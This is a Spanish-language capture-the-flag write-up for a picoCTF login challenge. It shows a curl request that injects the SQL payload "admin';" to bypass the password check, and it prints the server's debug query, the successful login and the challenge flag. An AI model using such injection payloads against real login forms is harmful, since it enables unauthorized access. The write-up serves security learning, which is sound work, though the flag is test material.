## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849
## Solución
En consola 
```bash
amer_br_-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username=admin'; &password=hola&debug=1"
<pre>username: admin'; 
password: hola
SQL query: SELECT * FROM users WHERE name='admin'; ' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>
```

En la interfaz:
Primero intentamos hacer lo mismo que en el reto anterior (Irish-Name-Repo 1) pero la página detecta la inyección.
![[Pasted image 20240925200113.png]]
Probamos con la inyección **admin';** que hara que la consulta del SQL query ignore la sentecia después del ; y así logramos tener acceso.
![[Pasted image 20240925200332.png]]

![[Pasted image 20240923105415.png]]
![[Pasted image 20240923105443.png]]
